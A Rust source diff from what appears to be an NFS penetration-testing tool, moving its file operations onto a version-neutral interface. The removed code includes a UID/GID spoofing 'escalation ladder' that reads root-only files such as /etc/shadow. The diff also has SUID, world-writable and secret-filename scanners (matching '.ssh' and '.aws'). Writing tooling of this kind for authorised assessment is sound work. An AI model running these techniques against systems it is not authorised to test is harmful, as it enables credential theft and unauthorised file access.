-                offset = offset.saturating_add(data.len() as u64);
-                if ok.eof || data.is_empty() {
-                    break;
-                }
-                // The server is untrusted: cap the download so endless non-EOF
-                // chunks can't fill the local disk or hang the loop (mirrors
-                // read_all's READ_ALL_MAX_BYTES guard).
-                if offset > READ_ALL_MAX_BYTES {
-                    anyhow::bail!("download aborted at {offset} bytes: exceeds {READ_ALL_MAX_BYTES}-byte cap (untrusted server returning endless non-EOF data)");
-                }
-            },
-            Nfs3Result::Err((stat, _)) => anyhow::bail!("READ at offset {offset}: {stat:?}"),
+        let data = ops.read_chunk(fh, offset, CHUNK_SIZE).await?;
+        if data.is_empty() {
+            break;
+        }
+        file.write_all(&data).map_err(|e| anyhow::anyhow!("write: {e}"))?;
+        hasher.update(&data);
+        offset = offset.saturating_add(data.len() as u64);
+        if offset > READ_ALL_MAX_BYTES {
+            anyhow::bail!("download aborted at {offset} bytes: exceeds {READ_ALL_MAX_BYTES}-byte cap (untrusted server returning endless non-EOF data)");
         }
     }
     let hash = hasher.finalize().iter().fold(String::with_capacity(64), |mut s, b| {
         use std::fmt::Write as _;
-        // Infallible: fmt::Write for String never fails.
         let _ = write!(s, "{b:02x}");
         s
     });
     Ok((offset, hash))
 }
 
-/// Download `fh` to `dest_path` with auto-UID escalation on `NFS3ERR_ACCES`.
+/// Write `data` to `fh` in CHUNK_SIZE slices via ShellOps.
 ///
-/// `download_file` issues READs with the current credential only; this wrapper
-/// mirrors `read_escalated` (used by `cat`) so `get` honours the same
-/// credential ladder (DESIGN.md decision 7). Without it, `cat /etc/shadow`
-/// succeeds (it escalates) while `get /etc/shadow` fails with NFS3ERR_ACCES.
-/// `download_file` re-creates the dest on each attempt, so a retry after an
-/// ACCES at offset 0 cleanly overwrites the empty file.
-async fn download_file_escalated(nfs3: &Nfs3Client, fh: &FileHandle, dest_path: &str, total_size: u64) -> anyhow::Result<(u64, String)> {
-    match download_file(nfs3, fh, dest_path, total_size).await {
-        Ok(r) => return Ok(r),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match download_file(&esc, fh, dest_path, total_size).await {
-            Ok(r) => {
-                tracing::debug!(uid, gid, "download escalated");
-                return Ok(r);
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
+/// Driven by a byte cursor into `data`: NFSv3 WRITE may legally write fewer
+/// bytes than requested (RFC 1813 sec. 3.3.7), so we advance only by the
+/// server-acknowledged count, resending the unwritten tail from the exact byte.
+async fn upload_data<O: ShellOps>(ops: &O, fh: &ShellHandle, data: &[u8]) -> anyhow::Result<u64> {
+    let chunk_size = usize::try_from(CHUNK_SIZE).unwrap_or(65536);
+    let mut pos = 0usize;
+    while pos < data.len() {
+        let end = pos.saturating_add(chunk_size).min(data.len());
+        let Some(slice) = data.get(pos..end) else { break };
+        let written = ops.write_chunk(fh, pos as u64, slice).await?;
+        let adv = usize::try_from(written).unwrap_or(0).min(slice.len());
+        if adv == 0 {
+            anyhow::bail!("WRITE at {pos}: server acknowledged 0 bytes (no progress)");
         }
+        pos = pos.saturating_add(adv);
     }
-    anyhow::bail!("NFS3ERR_ACCES: permission denied reading file (exhausted AUTH_SYS UID/GID escalation ladder)")
-}
-
-/// GETATTR a handle, escalating credentials on `NFS3ERR_ACCES`.
-///
-/// Used to resolve the type of directory entries the listing credential could
-/// not stat (e.g. a root-only hidden directory), so `tree` still descends.
-async fn getattr_escalated(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<FileAttrs> {
-    match getattr_fh(nfs3, fh).await {
-        Ok(a) => return Ok(a),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        if let Ok(a) = getattr_fh(&esc, fh).await {
-            return Ok(a);
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: GETATTR denied (exhausted escalation ladder)")
-}
-
-/// Validate that a server-supplied directory-entry name is safe to use as a
-/// single local path component during recursive download (`get -r`).
-///
-/// The NFS server is untrusted (threat model): directory-entry names come
-/// verbatim from the READDIRPLUS reply, so a hostile server can return a name
-/// like `../../../etc/cron.d/pwn` to escape the operator's chosen download root
-/// -- a zip-slip-class arbitrary local file write (and remote code execution
-/// when nfswolf runs under sudo). Accept only a lone, normal path component:
-/// reject empty, `.`, `..`, an embedded path separator, or a NUL byte.
-fn is_safe_local_name(name: &str) -> bool {
-    !name.is_empty() && name != "." && name != ".." && !name.contains('/') && !name.contains('\0')
+    Ok(pos as u64)
 }
 
 /// Recursively download a remote directory tree to a local path.
 ///
-/// Creates `local_root` if it does not exist.  Descends into subdirectories
-/// via READDIRPLUS.  Shows a single spinner progress bar shared across the
-/// entire tree walk.  Returns total bytes downloaded.
-fn download_tree<'a>(nfs3: &'a Nfs3Client, dir_fh: &'a FileHandle, local_root: &'a str, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
+/// Creates `local_root` if it does not exist. Descends into subdirectories.
+/// Shows a single spinner progress bar shared across the entire tree walk.
+/// Returns total bytes downloaded.
+fn download_tree<'a, O: ShellOps>(ops: &'a O, dir_fh: &'a ShellHandle, local_root: &'a str, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
     Box::pin(async move {
         std::fs::create_dir_all(local_root).map_err(|e| anyhow::anyhow!("mkdir {local_root}: {e}"))?;
 
@@ -1835,28 +1591,26 @@ fn download_tree<'a>(nfs3: &'a Nfs3Client, dir_fh: &'a FileHandle, local_root: &
         bar.set_style(ProgressStyle::default_spinner().template("{spinner} {msg}").unwrap_or_else(|_| ProgressStyle::default_spinner()));
         bar.set_message(local_root.to_owned());
 
-        let entries = list_dir(nfs3, dir_fh).await?;
+        let entries = ops.list_dir(dir_fh).await?;
         let mut total = 0u64;
 
         for entry in &entries {
-            // Reject server-controlled names that would escape `local_root`
-            // before they ever reach std::fs (path-traversal guard).
             if !is_safe_local_name(&entry.name) {
                 tracing::warn!("skipping entry with unsafe server-supplied name {:?} (path-traversal guard)", entry.name);
                 continue;
             }
             let local_entry = format!("{local_root}/{}", entry.name);
-            let is_dir = entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory);
+            let is_dir = entry.info.as_ref().is_some_and(|a| a.file_type == ShellFileType::Directory);
 
             if is_dir {
                 if let Some(ref fh) = entry.handle {
-                    total += download_tree(nfs3, fh, &local_entry, mp).await?;
+                    total += download_tree(ops, fh, &local_entry, mp).await?;
                 }
             } else {
-                let (fh, size) = match &entry.handle {
-                    Some(fh) => (fh.clone(), entry.attrs.as_ref().map_or(0, |a| a.size)),
-                    None => match lookup_one(nfs3, dir_fh, &entry.name).await {
-                        Ok((fh, a)) => (fh, a.size),
+                let fh = match &entry.handle {
+                    Some(fh) => fh.clone(),
+                    None => match ops.lookup(dir_fh, &entry.name).await {
+                        Ok((fh, _)) => fh,
                         Err(e) => {
                             tracing::warn!("skip {}: {e}", entry.name);
                             continue;
@@ -1864,7 +1618,7 @@ fn download_tree<'a>(nfs3: &'a Nfs3Client, dir_fh: &'a FileHandle, local_root: &
                     },
                 };
                 bar.set_message(format!("{local_root}/{}", entry.name));
-                match download_file_escalated(nfs3, &fh, &local_entry, size).await {
+                match download_file(ops, &fh, &local_entry).await {
                     Ok((bytes, _hash)) => {
                         total += bytes;
                         bar.inc(1);
@@ -1879,10 +1633,8 @@ fn download_tree<'a>(nfs3: &'a Nfs3Client, dir_fh: &'a FileHandle, local_root: &
     })
 }
 
-/// Recursively upload a local directory tree to a remote directory `remote_fh`.
-///
-/// Creates remote directories via MKDIR; uploads files via CREATE+WRITE.
-fn upload_tree<'a>(nfs3: &'a Nfs3Client, local_dir: &'a Path, remote_fh: &'a FileHandle, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
+/// Recursively upload a local directory tree to a remote directory via ShellOps.
+fn upload_tree<'a, O: ShellOps>(ops: &'a O, local_dir: &'a Path, remote_fh: &'a ShellHandle, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
     Box::pin(async move {
         let bar = mp.add(ProgressBar::new_spinner());
         bar.set_style(ProgressStyle::default_spinner().template("{spinner} {msg}").unwrap_or_else(|_| ProgressStyle::default_spinner()));
@@ -1909,14 +1661,14 @@ fn upload_tree<'a>(nfs3: &'a Nfs3Client, local_dir: &'a Path, remote_fh: &'a Fil
                 let dir_mode = entry.metadata().map_or(0o755, |m| m.permissions().mode() & 0o7777);
                 #[cfg(not(unix))]
                 let dir_mode = 0o755;
-                let sub_fh = match create_remote_dir(nfs3, remote_fh, name_str.as_ref(), dir_mode).await {
+                let sub_fh = match ops.mkdir(remote_fh, name_str.as_ref(), dir_mode).await {
                     Ok(fh) => fh,
                     Err(e) => {
                         tracing::warn!("mkdir {name_str}: {e}");
                         continue;
                     },
                 };
-                total += upload_tree(nfs3, &local_path, &sub_fh, mp).await?;
+                total += upload_tree(ops, &local_path, &sub_fh, mp).await?;
             } else {
                 #[cfg(unix)]
                 let file_mode = entry.metadata().map_or(0o644, |m| m.permissions().mode() & 0o7777);
@@ -1929,14 +1681,14 @@ fn upload_tree<'a>(nfs3: &'a Nfs3Client, local_dir: &'a Path, remote_fh: &'a Fil
                         continue;
                     },
                 };
-                let file_fh = match create_remote(nfs3, remote_fh, name_str.as_ref(), file_mode).await {
+                let file_fh = match ops.create_file(remote_fh, name_str.as_ref(), file_mode).await {
                     Ok(fh) => fh,
                     Err(e) => {
                         tracing::warn!("create {name_str}: {e}");
                         continue;
                     },
                 };
-                match upload_data(nfs3, &file_fh, &data).await {
+                match upload_data(ops, &file_fh, &data).await {
                     Ok(n) => {
                         total += n;
                         bar.inc(1);
@@ -1951,72 +1703,14 @@ fn upload_tree<'a>(nfs3: &'a Nfs3Client, local_dir: &'a Path, remote_fh: &'a Fil
     })
 }
 
-fn sattr3_with_mode(mode: u32) -> sattr3 {
-    sattr3 { mode: Nfs3Option::Some(mode), uid: Nfs3Option::None, gid: Nfs3Option::None, size: Nfs3Option::None, atime: set_atime::DONT_CHANGE, mtime: set_mtime::DONT_CHANGE }
-}
-
-/// MKDIR a directory in `parent_fh`, return the new directory handle.
-async fn create_remote_dir(nfs3: &Nfs3Client, parent_fh: &FileHandle, dirname: &str, mode: u32) -> anyhow::Result<FileHandle> {
-    let args = MKDIR3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(dirname.as_bytes().to_vec())) }, attributes: sattr3_with_mode(mode) };
-    match nfs3.mkdir(&args).await? {
-        Nfs3Result::Ok(ok) => match ok.obj {
-            Nfs3Option::Some(fh) => Ok(FileHandle::from_nfs_fh3(&fh)),
-            Nfs3Option::None => lookup_one(nfs3, parent_fh, dirname).await.map(|(fh, _)| fh),
-        },
-        Nfs3Result::Err((stat, _)) => anyhow::bail!("MKDIR {dirname}: {stat:?}"),
-    }
-}
-
-/// CREATE a file in `parent_fh` with `filename`, return the new file handle.
-async fn create_remote(nfs3: &Nfs3Client, parent_fh: &FileHandle, filename: &str, mode: u32) -> anyhow::Result<FileHandle> {
-    let args = CREATE3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(filename.as_bytes().to_vec())) }, how: createhow3::UNCHECKED(sattr3_with_mode(mode)) };
-    match nfs3.create(&args).await? {
-        Nfs3Result::Ok(ok) => match ok.obj {
-            Nfs3Option::Some(fh) => Ok(FileHandle::from_nfs_fh3(&fh)),
-            Nfs3Option::None => lookup_one(nfs3, parent_fh, filename).await.map(|(fh, _)| fh),
-        },
-        Nfs3Result::Err((stat, _)) => anyhow::bail!("CREATE {filename}: {stat:?}"),
-    }
-}
-
-/// Write `data` to `fh` in CHUNK_SIZE slices with FILE_SYNC stability.
-///
-/// Driven by a byte cursor into `data` (not a fixed chunk iterator): NFSv3 WRITE
-/// may legally write fewer bytes than requested (RFC 1813 sec. 3.3.7 -- `count`
-/// is the bytes actually written, a short write is a valid reply). Advancing only
-/// by the server-acknowledged `ok.count` resends the unwritten tail from the
-/// exact byte, so a short write no longer desyncs the cursor and silently
-/// corrupts / truncates the upload.
-async fn upload_data(nfs3: &Nfs3Client, fh: &FileHandle, data: &[u8]) -> anyhow::Result<u64> {
-    let chunk_size = usize::try_from(CHUNK_SIZE).unwrap_or(65536);
-    let mut pos = 0usize;
-    while pos < data.len() {
-        let end = pos.saturating_add(chunk_size).min(data.len());
-        let Some(slice) = data.get(pos..end) else { break };
-        let count = u32::try_from(slice.len()).unwrap_or(CHUNK_SIZE);
-        let args = WRITE3args { file: fh.to_nfs_fh3(), offset: pos as u64, count, stable: stable_how::FILE_SYNC, data: Opaque::owned(slice.to_vec()) };
-        match nfs3.write(&args).await? {
-            Nfs3Result::Ok(ok) => {
-                let written = usize::try_from(ok.count).unwrap_or(0).min(slice.len());
-                if written == 0 {
-                    anyhow::bail!("WRITE at {pos}: server acknowledged 0 bytes (no progress)");
-                }
-                pos = pos.saturating_add(written);
-            },
-            Nfs3Result::Err((stat, _)) => anyhow::bail!("WRITE at {pos}: {stat:?}"),
-        }
-    }
-    Ok(pos as u64)
-}
-
-/// Recursive tree display. Uses Box::pin to allow async recursion.
-fn tree_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, prefix: String, depth: usize, max_depth: usize) -> Pin<Box<dyn Future<Output = ()> + Send>> {
+/// Recursive tree display via ShellOps. Uses Box::pin to allow async recursion.
+fn tree_recursive<'a, O: ShellOps>(ops: &'a O, dir_fh: ShellHandle, prefix: String, depth: usize, max_depth: usize) -> Pin<Box<dyn Future<Output = ()> + Send + 'a>> {
     Box::pin(async move {
         if depth >= max_depth {
             return;
         }
 
-        let entries = match list_dir(&nfs3, &dir_fh).await {
+        let entries = match ops.list_dir(&dir_fh).await {
             Ok(v) => v,
             Err(e) => {
                 eprintln!("{prefix}  [error: {e}]");
@@ -2030,20 +1724,20 @@ fn tree_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, prefix: String, dep
             let is_last = i + 1 == total;
             let branch = if is_last { "\\-- " } else { "+-- " };
             let child_prefix = format!("{prefix}{}", if is_last { "    " } else { "|   " });
-            let tc = entry.attrs.as_ref().map_or('?', type_char);
+            let tc = entry.info.as_ref().map_or('?', |a| a.file_type.letter());
             let name = colorize_name(&entry.name, tc);
             println!("{prefix}{branch}{name}");
             // Descend into directories. When the listing credential couldn't
-            // stat the entry (tc == '?', e.g. a root-only hidden dir), probe
-            // with the escalation ladder so restricted dot-dirs still expand.
+            // stat the entry (tc == '?'), probe with getattr so restricted
+            // dot-dirs still expand.
             if let Some(ref fh) = entry.handle {
                 let is_dir = match tc {
                     'd' => true,
-                    '?' => getattr_escalated(&nfs3, fh).await.is_ok_and(|a| a.file_type == FileType::Directory),
+                    '?' => ops.getattr(fh).await.is_ok_and(|a| a.file_type == ShellFileType::Directory),
                     _ => false,
                 };
                 if is_dir {
-                    tree_recursive(Arc::clone(&nfs3), fh.clone(), child_prefix, depth + 1, max_depth).await;
+                    tree_recursive(ops, fh.clone(), child_prefix, depth + 1, max_depth).await;
                 }
             }
         }
@@ -2051,39 +1745,39 @@ fn tree_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, prefix: String, dep
 }
 
 /// Recursive find: print paths whose filename contains the pattern (case-insensitive).
-fn find_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String, pattern: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
+fn find_recursive<'a, O: ShellOps>(ops: &'a O, dir_fh: ShellHandle, dir_path: String, pattern: String) -> Pin<Box<dyn Future<Output = ()> + Send + 'a>> {
     Box::pin(async move {
-        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
+        let Ok(entries) = ops.list_dir(&dir_fh).await else { return };
         for entry in &entries {
             if entry.name == "." || entry.name == ".." {
                 continue;
             }
             let entry_path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
             if entry.name.to_ascii_lowercase().contains(&pattern) {
-                let tc = entry.attrs.as_ref().map_or('?', type_char);
+                let tc = entry.info.as_ref().map_or('?', |a| a.file_type.letter());
                 println!("{}", colorize_name(&entry_path, tc));
             }
-            if entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory)
+            if entry.info.as_ref().is_some_and(|a| a.file_type == ShellFileType::Directory)
                 && let Some(ref fh) = entry.handle
             {
-                find_recursive(Arc::clone(&nfs3), fh.clone(), entry_path, pattern.clone()).await;
+                find_recursive(ops, fh.clone(), entry_path, pattern.clone()).await;
             }
         }
     })
 }
 
-/// Recursive SUID/SGID scanner.
-fn suid_scan_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
+/// Recursive SUID/SGID scanner via ShellOps.
+fn suid_scan_recursive<'a, O: ShellOps>(ops: &'a O, dir_fh: ShellHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send + 'a>> {
     Box::pin(async move {
-        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
+        let Ok(entries) = ops.list_dir(&dir_fh).await else { return };
         for entry in &entries {
             if entry.name == "." || entry.name == ".." {
                 continue;
             }
             let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
-            if let Some(ref a) = entry.attrs {
+            if let Some(ref a) = entry.info {
                 // SUID = 0o4000, SGID = 0o2000 (RFC 1094 sec. 2.3.5)
-                if a.file_type == FileType::Regular && (a.mode & 0o6000 != 0) {
+                if a.file_type == ShellFileType::Regular && (a.mode & 0o6000 != 0) {
                     let tag = match a.mode & 0o6000 {
                         0o6000 => "SUID+SGID",
                         0o4000 => "SUID",
@@ -2091,39 +1785,75 @@ fn suid_scan_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: Stri
                     };
                     println!("{} {:04o}  uid={}  {path}", format!("[!] {tag}").yellow().bold(), a.mode & 0o7777, a.uid);
                 }
-                if a.file_type == FileType::Directory
+                if a.file_type == ShellFileType::Directory
                     && let Some(ref fh) = entry.handle
                 {
-                    suid_scan_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
+                    suid_scan_recursive(ops, fh.clone(), path).await;
                 }
             }
         }
     })
 }
 
-/// Recursive world-writable scanner.
-fn world_writable_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
+/// Recursive world-writable scanner via ShellOps.
+fn world_writable_recursive<'a, O: ShellOps>(ops: &'a O, dir_fh: ShellHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send + 'a>> {
     Box::pin(async move {
-        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
+        let Ok(entries) = ops.list_dir(&dir_fh).await else { return };
         for entry in &entries {
             if entry.name == "." || entry.name == ".." {
                 continue;
             }
             let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
-            if let Some(ref a) = entry.attrs {
+            if let Some(ref a) = entry.info {
                 // World-write bit = 0o002
                 if a.mode & 0o002 != 0 {
-                    let tc = type_char(a);
+                    let tc = a.file_type.letter();
                     println!("{} {:04o}  uid={}  {path}", format!("[!] world-writable ({tc})").yellow(), a.mode & 0o7777, a.uid);
                 }
-                if a.file_type == FileType::Directory
+                if a.file_type == ShellFileType::Directory
                     && let Some(ref fh) = entry.handle
                 {
-                    world_writable_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
+                    world_writable_recursive(ops, fh.clone(), path).await;
                 }
             }
         }
     })
+}
+
+/// Recursive secrets scanner via ShellOps.
+fn secrets_recursive<'a, O: ShellOps>(ops: &'a O, dir_fh: ShellHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send + 'a>> {
+    Box::pin(async move {
+        let Ok(entries) = ops.list_dir(&dir_fh).await else { return };
+        for entry in &entries {
+            if entry.name == "." || entry.name == ".." {
+                continue;
+            }
+            let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
+            let lower = entry.name.to_ascii_lowercase();
+            if SECRET_PATTERNS.iter().any(|pat| lower.contains(pat)) {
+                let size = entry.info.as_ref().map_or(0, |a| a.size);
+                println!("{} {path}  ({size} bytes)", "[!] potential secret:".yellow().bold());
+            }
+            if entry.info.as_ref().is_some_and(|a| a.file_type == ShellFileType::Directory)
+                && let Some(ref fh) = entry.handle
+            {
+                secrets_recursive(ops, fh.clone(), path).await;
+            }
+        }
+    })
+}
+
+/// Validate that a server-supplied directory-entry name is safe to use as a
+/// single local path component during recursive download (`get -r`).
+///
+/// The NFS server is untrusted (threat model): directory-entry names come
+/// verbatim from the READDIRPLUS reply, so a hostile server can return a name
+/// like `../../../etc/cron.d/pwn` to escape the operator's chosen download root
+/// -- a zip-slip-class arbitrary local file write (and remote code execution
+/// when nfswolf runs under sudo). Accept only a lone, normal path component:
+/// reject empty, `.`, `..`, an embedded path separator, or a NUL byte.
+fn is_safe_local_name(name: &str) -> bool {
+    !name.is_empty() && name != "." && name != ".." && !name.contains('/') && !name.contains('\0')
 }
 
 /// Common credential/secret filename patterns to flag during a secrets scan.
@@ -2163,46 +1893,9 @@ const SECRET_PATTERNS: &[&str] = &[
     ".aws",
     ".ssh",
 ];
-
-/// Recursive secrets scanner.
-fn secrets_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
-    Box::pin(async move {
-        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
-        for entry in &entries {
-            if entry.name == "." || entry.name == ".." {
-                continue;
-            }
-            let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
-            let lower = entry.name.to_ascii_lowercase();
-            if SECRET_PATTERNS.iter().any(|pat| lower.contains(pat)) {
-                let size = entry.attrs.as_ref().map_or(0, |a| a.size);
-                println!("{} {path}  ({size} bytes)", "[!] potential secret:".yellow().bold());
-            }
-            if entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory)
-                && let Some(ref fh) = entry.handle
-            {
-                secrets_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
-            }
-        }
-    })
-}
-
 // =============================================================================
 // Pure formatting helpers
 // =============================================================================
-
-/// Derive fuser-style file type character from `FileAttrs`.
-const fn type_char(a: &FileAttrs) -> char {
-    match a.file_type {
-        FileType::Directory => 'd',
-        FileType::Symlink => 'l',
-        FileType::Block => 'b',
-        FileType::Character => 'c',
-        FileType::Fifo => 'p',
-        FileType::Socket => 's',
-        FileType::Regular => '-',
-    }
-}
 
 /// Format a Unix permission mode word as `rwxrwxrwx` (9 chars).
 fn format_mode(mode: u32) -> String {
@@ -2220,22 +1913,20 @@ fn colorize_name(name: &str, tc: char) -> String {
     }
 }
 
-/// Print detailed stat output for a file.
-///
-/// Displays all 13 fields from the NFSv3 fattr3 wire format (RFC 1813 sec. 2.6).
-fn print_stat(name: &str, a: &FileAttrs) {
+/// Print detailed stat output for a file (version-neutral).
+fn print_stat(name: &str, a: &ShellFileInfo) {
     println!("  File: {name}");
-    println!("  Type: {:?}", a.file_type);
-    println!("  Mode: {:04o} ({}{})  Links: {}", a.mode & 0o7777, type_char(a), format_mode(a.mode), a.nlink);
+    println!("  Type: {}", a.type_name());
+    println!("  Mode: {:04o} ({})  Links: {}", a.mode & 0o7777, a.mode_string(), a.nlink);
     println!("   UID: {}  GID: {}", a.uid, a.gid);
     println!(" Inode: {}  FSID: {}", a.fileid, a.fsid);
     println!("  Size: {} bytes  Used: {} bytes (disk)", a.size, a.used);
-    if a.file_type == FileType::Block || a.file_type == FileType::Character {
+    if a.file_type == ShellFileType::Block || a.file_type == ShellFileType::Character {
         println!(" Rdev: {}:{}", a.rdev.0, a.rdev.1);
     }
-    println!(" atime: {}  ({}.{})", fmt_unix_time(a.atime.seconds), a.atime.seconds, a.atime.nseconds);
-    println!(" mtime: {}  ({}.{})", fmt_unix_time(a.mtime.seconds), a.mtime.seconds, a.mtime.nseconds);
-    println!(" ctime: {}  ({}.{})", fmt_unix_time(a.ctime.seconds), a.ctime.seconds, a.ctime.nseconds);
+    println!(" atime: {}  ({})", fmt_unix_time(a.atime_secs), a.atime_secs);
+    println!(" mtime: {}  ({})", fmt_unix_time(a.mtime_secs), a.mtime_secs);
+    println!(" ctime: {}  ({})", fmt_unix_time(a.ctime_secs), a.ctime_secs);
 }
 
 /// Build a display path by appending `target` to `cwd`.
@@ -2360,52 +2051,49 @@ fn parse_ls_args(raw: &str) -> (LsSort, bool, bool, &str) {
     (sort, reverse, all_cols, rest)
 }
 
-/// Compare two directory entries for stable `ls` sorting.
-///
-/// Ties at every level are broken by byte-order filename comparison so the
-/// result is deterministic regardless of server-returned order.
-fn ls_cmp(a: &DirEntryPlus, b: &DirEntryPlus, sort: LsSort) -> std::cmp::Ordering {
+/// Compare two `ShellEntry` values for stable `ls` sorting (version-neutral).
+fn ls_cmp_shell(a: &ShellEntry, b: &ShellEntry, sort: LsSort) -> std::cmp::Ordering {
     let name_ord = a.name.cmp(&b.name);
     match sort {
         LsSort::Name => name_ord,
         LsSort::Inode => {
-            let ia = a.attrs.as_ref().map_or(0u64, |x| x.fileid);
-            let ib = b.attrs.as_ref().map_or(0u64, |x| x.fileid);
+            let ia = a.info.as_ref().map_or(0u64, |x| x.fileid);
+            let ib = b.info.as_ref().map_or(0u64, |x| x.fileid);
             ia.cmp(&ib).then(name_ord)
         },
         LsSort::Size => {
-            let sa = a.attrs.as_ref().map_or(0u64, |x| x.size);
-            let sb = b.attrs.as_ref().map_or(0u64, |x| x.size);
+            let sa = a.info.as_ref().map_or(0u64, |x| x.size);
+            let sb = b.info.as_ref().map_or(0u64, |x| x.size);
             sa.cmp(&sb).then(name_ord)
         },
         LsSort::Uid => {
-            let ua = a.attrs.as_ref().map_or(0u32, |x| x.uid);
-            let ub = b.attrs.as_ref().map_or(0u32, |x| x.uid);
+            let ua = a.info.as_ref().map_or(0u32, |x| x.uid);
+            let ub = b.info.as_ref().map_or(0u32, |x| x.uid);
             ua.cmp(&ub).then(name_ord)
         },
         LsSort::Gid => {
-            let ga = a.attrs.as_ref().map_or(0u32, |x| x.gid);
-            let gb = b.attrs.as_ref().map_or(0u32, |x| x.gid);
+            let ga = a.info.as_ref().map_or(0u32, |x| x.gid);
+            let gb = b.info.as_ref().map_or(0u32, |x| x.gid);
             ga.cmp(&gb).then(name_ord)
         },
         LsSort::Mode => {
-            let ma = a.attrs.as_ref().map_or(0u32, |x| x.mode);
-            let mb = b.attrs.as_ref().map_or(0u32, |x| x.mode);
+            let ma = a.info.as_ref().map_or(0u32, |x| x.mode);
+            let mb = b.info.as_ref().map_or(0u32, |x| x.mode);
             ma.cmp(&mb).then(name_ord)
         },
         LsSort::Mtime => {
-            let ta = a.attrs.as_ref().map_or(0u32, |x| x.mtime.seconds);
-            let tb = b.attrs.as_ref().map_or(0u32, |x| x.mtime.seconds);
+            let ta = a.info.as_ref().map_or(0u32, |x| x.mtime_secs);
+            let tb = b.info.as_ref().map_or(0u32, |x| x.mtime_secs);
             ta.cmp(&tb).then(name_ord)
         },
         LsSort::Ctime => {
-            let ta = a.attrs.as_ref().map_or(0u32, |x| x.ctime.seconds);
-            let tb = b.attrs.as_ref().map_or(0u32, |x| x.ctime.seconds);
+            let ta = a.info.as_ref().map_or(0u32, |x| x.ctime_secs);
+            let tb = b.info.as_ref().map_or(0u32, |x| x.ctime_secs);
             ta.cmp(&tb).then(name_ord)
         },
         LsSort::Atime => {
-            let ta = a.attrs.as_ref().map_or(0u32, |x| x.atime.seconds);
-            let tb = b.attrs.as_ref().map_or(0u32, |x| x.atime.seconds);
+            let ta = a.info.as_ref().map_or(0u32, |x| x.atime_secs);
+            let tb = b.info.as_ref().map_or(0u32, |x| x.atime_secs);
             ta.cmp(&tb).then(name_ord)
         },
     }
@@ -2466,95 +2154,6 @@ fn parse_uid_gid(spec: &str) -> (Option<u32>, Option<u32>) {
     } else {
         (spec.parse::<u32>().ok(), None)
     }
-}
-
-/// True when an anyhow error contains a permission-denied NFS status.
-fn is_nfs_acces(e: &anyhow::Error) -> bool {
-    let msg = e.to_string();
-    msg.contains("NFS3ERR_ACCES") || msg.contains("NFS3ERR_PERM")
-}
-
-/// True when an anyhow error reports a read-only-filesystem NFS status.
-fn is_nfs_rofs(e: &anyhow::Error) -> bool {
-    e.to_string().contains("NFS3ERR_ROFS")
-}
-
-/// Print a write-side NFS error and, for `NFS3ERR_ROFS`, an actionable hint.
-///
-/// Used by every write command (mkdir, rm, mv, chmod, ...) so a read-only
-/// export gives one consistent explanation instead of a bare status code.
-fn report_write_stat(op: &str, fault: &Nfs3Fault<nfswolf_rpc::RpcError>) {
-    eprintln!("{}", format!("{op}: {fault}").red());
-    if matches!(fault.status(), Some(Nfs3Error::Rofs)) {
-        print_rofs_hint();
-    }
-}
-
-/// Explain that the export is read-only (`ro`) and how to bypass it.
-///
-/// `ro` is enforced server-side (RFC 2623 sec. 2.6): no AUTH_SYS credential
